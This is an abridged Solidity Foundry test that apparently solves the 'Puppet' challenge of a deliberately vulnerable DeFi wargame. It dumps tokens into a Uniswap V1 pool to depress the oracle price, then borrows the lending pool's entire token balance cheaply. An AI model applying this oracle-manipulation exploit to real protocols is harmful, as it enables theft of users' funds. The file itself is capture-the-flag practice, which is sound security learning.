...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        ...
        uniswapV1Exchange.tokenToEthSwapInput(
            ...
            uniswapV1Exchange.getTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE),
            block.timestamp * 2
        );
        console.log(player.balance);
        uint256 value = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        assertLe(value, player.balance);
        lendingPool.borrow{value: value}(POOL_INITIAL_TOKEN_BALANCE, recovery);
        console.log(vm.getNonce(player));
        new DummyContract();    // for the nonce to increase
        console.log(vm.getNonce(player));
    }
